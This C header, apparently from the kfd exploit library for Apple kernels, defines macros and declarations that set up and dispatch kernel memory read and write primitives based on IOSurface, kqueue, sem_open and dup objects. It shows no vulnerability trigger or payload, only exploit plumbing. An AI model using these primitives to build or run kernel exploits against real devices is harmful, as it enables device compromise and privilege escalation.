/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef krkw_h
#define krkw_h

#include "common.h"
#include "../libkfd.h"

#include "krkw/kwrite/kwrite_IOSurface.h"
#include "krkw/kread/kread_IOSurface.h"

#define kread_from_method(type, method)                                             \
    do {                                                                            \
        volatile type* type_base = (volatile type*)(uaddr);                         \
        uint64_t type_size = ((size) / (sizeof(type)));                                  \
        for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {         \
            type type_value = method(kfd, kaddr + (type_offset * sizeof(type)));    \
            type_base[type_offset] = type_value;                                    \
        }                                                                           \
    } while (0)

#include "krkw/kread/kread_kqueue_workloop_ctl.h"
#include "krkw/kread/kread_sem_open.h"

#define kwrite_from_method(type, method)                                       \
    do {                                                                       \
        volatile type* type_base = (volatile type*)(uaddr);                    \
        uint64_t type_size = ((size) / (sizeof(type)));                             \
        for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {    \
            type type_value = type_base[type_offset];                          \
            method(kfd, kaddr + (type_offset * sizeof(type)), type_value);     \
        }                                                                      \
    } while (0)

#include "krkw/kwrite/kwrite_dup.h"
#include "krkw/kwrite/kwrite_sem_open.h"

// Forward declarations for helper functions.
void krkw_helper_init(struct kfd* kfd, struct krkw* krkw);
void krkw_helper_grab_free_pages(struct kfd* kfd);
void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw);
void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw);
void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);

#define kread_method_case(method)                                       \
    case method: {                                                      \
        const char* method_name = #method;                              \
        print_string(method_name);                                      \
        kfd->kread.krkw_method_ops.init = method##_init;                \
        kfd->kread.krkw_method_ops.allocate = method##_allocate;        \
        kfd->kread.krkw_method_ops.search = method##_search;            \
        kfd->kread.krkw_method_ops.kread = method##_kread;              \
        kfd->kread.krkw_method_ops.kwrite = NULL;                       \
        kfd->kread.krkw_method_ops.find_proc = method##_find_proc;      \
        kfd->kread.krkw_method_ops.deallocate = method##_deallocate;    \
        kfd->kread.krkw_method_ops.free = method##_free;                \
        break;                                                          \
    }

#define kwrite_method_case(method)                                       \
    case method: {                                                       \
        const char* method_name = #method;                               \
        print_string(method_name);                                       \
        kfd->kwrite.krkw_method_ops.init = method##_init;                \
        kfd->kwrite.krkw_method_ops.allocate = method##_allocate;        \
        kfd->kwrite.krkw_method_ops.search = method##_search;            \
        kfd->kwrite.krkw_method_ops.kread = NULL;                        \
        kfd->kwrite.krkw_method_ops.kwrite = method##_kwrite;            \
        kfd->kwrite.krkw_method_ops.find_proc = method##_find_proc;      \
        kfd->kwrite.krkw_method_ops.deallocate = method##_deallocate;    \
        kfd->kwrite.krkw_method_ops.free = method##_free;                \
        break;                                                           \
    }


void krkw_init(struct kfd* kfd, uint64_t kread_method, uint64_t kwrite_method, const char *IOSurface);

void krkw_run(struct kfd* kfd);

void krkw_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size);

void krkw_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size);

void krkw_free(struct kfd* kfd);
#endif /* krkw_h */
